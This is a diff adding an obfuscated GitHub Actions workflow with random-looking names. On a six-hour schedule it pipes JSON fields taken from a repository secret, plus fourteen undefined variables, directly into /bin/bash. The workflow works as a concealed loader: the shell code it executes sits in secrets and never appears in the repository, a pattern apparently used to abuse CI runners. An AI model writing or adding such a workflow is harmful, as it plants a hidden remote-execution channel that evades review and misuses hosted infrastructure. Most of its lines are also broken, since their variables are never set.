@@ -1,0 +1,33 @@
+name: qiaodingnmaskma
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaodingnmaskma
+        env:
+          rbhy9091: ${{ secrets.rbhy9091 }}
+        run: |
+          echo $rbhy9091 | jq -r .my45 | /bin/bash
+          echo $melx608 | jq -r .x2 | /bin/bash
+          echo $d8634 | jq -r .osfzp7 | /bin/bash
+          echo $bxf30 | jq -r .pvwno07818 | /bin/bash
+          echo $clhhq0892 | jq -r .ms514 | /bin/bash
+          echo $cq8987 | jq -r .za77238 | /bin/bash
+          echo $cap69 | jq -r .tovj92 | /bin/bash
+          echo $wenlc52 | jq -r .smgwb06699 | /bin/bash
+          echo $putu64 | jq -r .tiz6822 | /bin/bash
+          echo $shjwn81366 | jq -r .n248 | /bin/bash
+          echo $klful02 | jq -r .tswy963 | /bin/bash
+          echo $kyj4 | jq -r .oe94810 | /bin/bash
+          echo $xz2 | jq -r .k0302 | /bin/bash
+          echo $foco3469 | jq -r .yurv5 | /bin/bash
+          echo $agex4 | jq -r .pecc3899 | /bin/bash
+
